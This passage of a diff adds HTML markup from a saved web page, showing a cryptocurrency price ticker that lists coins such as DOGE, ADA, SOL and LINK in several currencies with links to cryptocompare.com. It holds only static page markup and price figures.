+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOGE: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOGE_USD">
+								$ 0.07291
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOGE_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDOGE_USD">2.14 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/doge/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/doge.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOGE: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOGE_EUR">
+								€ 0.06387
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOGE_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDOGE_EUR">1.94 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/doge/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/doge.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOGE: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOGE_CNY">
+								¥ 0.04687
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOGE_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctDOGE_CNY">-0.35 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/doge/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/doge.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOGE: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOGE_GBP">
+								£ 0.05460
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOGE_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDOGE_GBP">1.29 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ada/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ada.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ADA: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ADA_USD">
+								$ 0.1563
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ADA_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctADA_USD">3.79 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ada/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ada.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ADA: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ADA_EUR">
+								€ 0.1369
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ADA_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctADA_EUR">3.69 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ada/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ada.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ADA: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ADA_CNY">
+								¥ 8.58
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ADA_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctADA_CNY">0.00 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ada/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ada.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ADA: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ADA_GBP">
+								£ 0.1170
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ADA_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctADA_GBP">3.03 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dai/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dai.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DAI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DAI_USD">
+								$ 0.9997
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DAI_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDAI_USD">0.01 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dai/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dai.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DAI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DAI_EUR">
+								€ 0.8757
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DAI_EUR"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctDAI_EUR">-0.15 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dai/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dai.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DAI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DAI_CNY">
+								¥ 0.6614
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DAI_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDAI_CNY">0.00 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dai/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dai.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DAI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DAI_GBP">
+								£ 0.7486
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DAI_GBP"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctDAI_GBP">-0.78 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dot/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dot.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOT: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOT_USD">
+								$ 0.8447
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOT_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDOT_USD">0.89 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dot/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dot.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOT: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOT_EUR">
+								€ 0.7400
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOT_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDOT_EUR">0.72 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dot/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dot.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOT: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOT_CNY">
+								¥ 0.5429
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOT_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctDOT_CNY">-1.37 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/dot/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/dot.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">DOT: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_DOT_GBP">
+								£ 0.6326
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_DOT_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctDOT_GBP">0.08 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/trx/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/trx.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">TRX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_TRX_USD">
+								$ 0.3172
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_TRX_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctTRX_USD">0.39 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/trx/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/trx.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">TRX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_TRX_EUR">
+								€ 0.2779
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_TRX_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctTRX_EUR">0.22 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/trx/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/trx.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">TRX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_TRX_CNY">
+								¥ 0.2039
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_TRX_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctTRX_CNY">-2.20 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/trx/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/trx.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">TRX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_TRX_GBP">
+								£ 0.2376
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_TRX_GBP"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctTRX_GBP">-0.42 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ltc/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ltc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LTC_USD">
+								$ 42.83
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LTC_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctLTC_USD">1.42 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ltc/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ltc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LTC_EUR">
+								€ 37.52
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LTC_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctLTC_EUR">1.22 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ltc/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ltc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LTC_CNY">
+								¥ 27.53
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LTC_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctLTC_CNY">-1.04 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/ltc/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/ltc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LTC_GBP">
+								£ 32.07
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LTC_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctLTC_GBP">0.58 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/shib/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/shib.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SHIB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SHIB_USD">
+								$ 0.00000430
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SHIB_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctSHIB_USD">1.64 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/shib/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/shib.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SHIB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SHIB_EUR">
+								€ 0.00000376
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SHIB_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctSHIB_EUR">1.38 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/shib/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/shib.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SHIB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SHIB_CNY">
+								¥ 0.00000275
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SHIB_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctSHIB_CNY">-1.39 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/shib/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/shib.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SHIB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SHIB_GBP">
+								£ 0.00000322
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SHIB_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctSHIB_GBP">0.73 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/sol/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/sol.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SOL: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SOL_USD">
+								$ 78.25
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SOL_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctSOL_USD">3.86 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/sol/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/sol.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SOL: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SOL_EUR">
+								€ 68.55
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SOL_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctSOL_EUR">3.65 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/sol/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/sol.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SOL: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SOL_CNY">
+								¥ 50.30
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SOL_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctSOL_CNY">1.39 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/sol/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/sol.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">SOL: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_SOL_GBP">
+								£ 58.59
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_SOL_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctSOL_GBP">3.14 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/uni/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/uni.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">UNI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_UNI_USD">
+								$ 2.84
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_UNI_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctUNI_USD">2.74 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/uni/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/uni.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">UNI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_UNI_EUR">
+								€ 2.49
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_UNI_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctUNI_EUR">2.52 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/uni/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/uni.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">UNI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_UNI_CNY">
+								¥ 1.82
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_UNI_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctUNI_CNY">0.25 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/uni/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/uni.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">UNI: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_UNI_GBP">
+								£ 2.13
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_UNI_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctUNI_GBP">1.87 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/avax/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/avax.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">AVAX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_AVAX_USD">
+								$ 6.69
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_AVAX_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctAVAX_USD">0.56 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/avax/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/avax.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">AVAX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_AVAX_EUR">
+								€ 5.87
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_AVAX_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctAVAX_EUR">0.37 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/avax/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/avax.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">AVAX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_AVAX_CNY">
+								¥ 4.31
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_AVAX_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctAVAX_CNY">-1.79 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/avax/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/avax.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">AVAX: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_AVAX_GBP">
+								£ 5.01
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_AVAX_GBP"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctAVAX_GBP">-0.27 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/link/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/link.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">LINK: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_LINK_USD">
+								$ 7.48
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_LINK_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctLINK_USD">3.46 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
